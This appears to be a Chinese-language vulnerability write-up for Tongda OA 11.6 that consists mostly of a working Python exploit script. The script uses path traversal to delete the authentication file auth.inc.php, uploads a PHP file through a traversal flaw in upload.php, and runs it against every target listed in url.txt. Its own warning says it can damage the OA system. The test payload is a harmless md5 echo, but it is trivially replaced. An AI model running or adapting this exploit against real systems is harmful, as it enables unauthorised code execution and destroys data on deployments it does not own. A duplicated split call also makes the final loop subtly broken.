<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>通达oa 11.6 远程命令执行漏洞</h1><h2>一、漏洞简介</h2><p>此漏洞会导致网站程序严重损坏，并影响网站业务正常运行，请谨慎使用！</p><h2>二、漏洞影响</h2><p>通达oa &lt;= 11.6</p><h2>三、复现过程</h2><h3>poc</h3><p>#! /usr/bin/env python3<br /># -*- coding: utf-8 -*-<br />import requests<br />#by Tommy，在原作者上修改而来，2020-8-19，通达OA 0 day漏洞利用<br />import sys<br />version = sys.version_info<br />if version &lt; (3, 0):<br />    print('The current version is not supported, you need to use python3')<br />    sys.exit()<br />    <br />def exploit(target):<br />    try:<br />        target=target<br />        payload='&lt;?php echo md5(&quot;exp-test&quot;); ?&gt;'#无害检测<br />        print(target,"[*]删除auth.inc.php...")<br /><br />        url=target+"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"#删除auth.inc.php请求<br />        requests.get(url=url,verify=False,timeout=10)<br />        print(target,"[*]正在检查文件是否已删除...")<br />        url=target+"/inc/auth.inc.php"<br />        page=requests.get(url=url,verify=False,timeout=10).text<br />        #print(page)<br />        if 'No input file specified.' not in page:<br />            print(target,"[-]无法删除auth.inc.php文件")<br />            return 0<br />        print(target,"[+]删除auth.inc.php成功")<br />        print(target,"[*]开始上传payload...")<br />        url=target+"/general/data_center/utils/upload.php?action=upload&amp;filetype=nmsl&amp;repkid=/.&lt;&gt;./.&lt;&gt;./.&lt;&gt;./"<br />        files = {'FILE1': ('deconf.php', payload)}<br />        requests.post(url=url,files=files,verify=False,timeout=10)<br />        url=target+"/_deconf.php"<br />        page=requests.get(url=url,verify=False,timeout=10).text<br />        if 'No input file specified.' not in page:<br />            print("[+]************************文件已存在，上传成功************************")<br />            if '8a8127bc83b94ad01414a7a3ea4b8' in page:#如果执行过md5函数，才确认漏洞存在，减少误报<br />                print(target,"************************代码执行成功，存在漏洞************************")<br />                print(target,"[+]URL:",url)<br />        else:<br />            print(target,"[-]文件上传失败")<br />    except Exception as e:<br />        print(target,e)<br />urls='url.txt'<br />print("[*]警告：利用此漏洞，会删除auth.inc.php，这可能会损坏OA系统")<br />input("按Enter继续")<br />for url in open(urls,'r',encoding='utf-8').read().split('\n'):<br />    url=url.split()<br />    url=url.split()<br />    exploit(url[0])</p></body></html>